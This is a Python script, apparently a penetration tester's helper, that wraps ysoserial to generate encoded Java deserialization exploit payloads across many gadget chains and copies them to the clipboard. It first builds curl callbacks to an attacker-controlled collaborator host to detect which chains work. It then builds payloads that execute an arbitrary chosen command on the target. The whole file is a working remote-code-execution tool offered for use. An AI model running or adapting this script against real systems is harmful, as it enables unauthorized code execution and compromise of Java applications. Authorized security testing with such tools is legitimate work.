#!/usr/bin/python

import subprocess
import os
from gzip import compress
import urllib.parse
import base64
import argparse
import pyperclip

# Temporary add the Java executable directory to the PATH environment variable
java_bin_path = "/usr/lib/jvm/java-11-openjdk-amd64/bin"
os.environ["PATH"] = f"{java_bin_path}:{os.environ['PATH']}"

ysoserial_payloads = ['BeanShell1', 'Click1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1',
                      'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5',
                      'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2',
                      'JBossInterceptors1', 'JRMPClient', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2',
                      'Myfaces1', 'ROME', 'Spring1', 'Spring2', 'URLDNS', 'Vaadin1']

generated_payloads = []


def base64_encode(input):
    encoded_bytes = base64.b64encode(input)
    encoded_string = encoded_bytes.decode('utf-8')
    return encoded_string


def run_shell_command(command, gzip, b64):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        exit_code = process.returncode

        if exit_code == 70:
            print('[-] Please use JAVA 11 - ')
            print('[-] sudo apt-get install openjdk-11-jdk')
            exit()

        data = stdout
        if gzip:
            data = compress(data)
        data = base64_encode(data)

        if not b64:
            data = urllib.parse.quote_plus(data)

        return data
    except Exception as e:
        print(-1, '::', str(e))
        return False


def print_usage():
    print("Usage: ysoserial-wrap.py -c 'command' [-gzip] -e")
    print("  -c, --command	 Command to be executed by ysoserial-wrap")
    print(" Payloads will be base64 and then url encoded")
    print("  -gzip       	 	Compress the payload with gzip before encoding in base64")
    print("  -b64  	            Do not url-encode, output base64 string")


def main():
    parser = argparse.ArgumentParser(description="ysoserial-wrap.py - Command execution wrapper for ysoserial-all.jar")
    parser.add_argument('-c', '--command', metavar="'COMMAND'", help="Command to be executed")
    parser.add_argument('-gzip', action="store_true", help="Compress the payload with gzip before encoding in base64")
    parser.add_argument('-b64', action="store_true", help="Do not url-encode, output base64 string")
    args = parser.parse_args()

    if not args.command:
        print("[*] No payload defined, using curl <collaborator_payload>/[payload_name]")
        collab_server = input('[!]\tEnter your collaborator payload:\n')

    # Testing JAVA
    test_command = "java -jar ysoserial-all.jar CommonsCollections4 'whoami'"
    run_shell_command(test_command, False, False)
    print("[+] JAVA 11 is working ...")

    i = 0
    for payload in ysoserial_payloads:
        i += 1
        if args.command:
            print(f"[+]\tGenerating {payload} payload ...")
            if payload in ["URLDNS"]:
                print('[-]\tURLDNS!!! skipping')
                i -= 1
                continue
            
            command = False
            if payload == 'JRMPClient' and "://" in args.command:
                command = args.command.split("://")[1]
            generated_payloads.append(
                run_shell_command(f"java -jar ysoserial-all.jar {payload} '{command if command else args.command}'",
                                  args.gzip, args.b64))

        else:
            print(f"[+]\tGenerating {payload} payload ...")
            if payload == "URLDNS":
                command = f"https://{collab_server}/{payload}."
            else:
                command = f"curl {collab_server}/{payload}"
            generated_payloads.append(
                run_shell_command(f"java -jar ysoserial-all.jar {payload} '{command}'", args.gzip, args.b64))

    pyperclip.copy("\n".join(generated_payloads))
    print(f"\n[!] There are {i} payloads waiting in your clipboard ...")

    if not args.command:
        generated_exploits = []
        worked_commands = input("\n[!] Paste in the payloads that worked (separated by spaces)\n")        
        command = input('\n[!] Paste in the command you want to execute:\n')
        
        i = 0
        for payload in worked_commands.split(' '):
            i += 1
            print(f"[+]\tGenerating exploit with payload {payload} ...")
            generated_exploits.append(
                run_shell_command(f"java -jar ysoserial-all.jar {payload} '{command}'", args.gzip, args.b64))

        pyperclip.copy("\n".join(generated_exploits))
        print(f"\n[!] There are {i} exploits waiting in your clipboard... ")
        print('Good luck\n')


if __name__ == "__main__":
    main()
